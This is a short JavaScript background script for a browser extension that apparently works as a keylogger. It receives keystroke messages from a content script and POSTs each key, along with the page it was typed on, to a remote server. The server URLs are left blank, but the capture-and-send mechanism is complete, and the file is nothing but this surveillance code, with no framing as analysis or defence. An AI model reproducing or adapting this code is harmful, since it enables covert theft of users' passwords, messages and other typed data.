chrome.runtime.onMessage.addListener(function(request, sender, sendResponse ){
  if (request.type === "keyup") {
    var http = new XMLHttpRequest();
    var url = "";
    http.open("POST", url, true);
    http.send(JSON.stringify({"key": request.key}));
  }
});

function handleMessage(request){  //Process data received
  //alert(request.key);
  //alert(request.page);

  data = "key="+request.key+"&page"+request.page;
  var x = new XMLHttpRequest();     //XMLHttpRequest object used to make http requests using javascript, this will allow us to send data to server
  x.open("POST", "http://", true);
  x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  x.send(data);
}
chrome.runtime.onMessage.addListener(handleMessage); //Receive message from content.js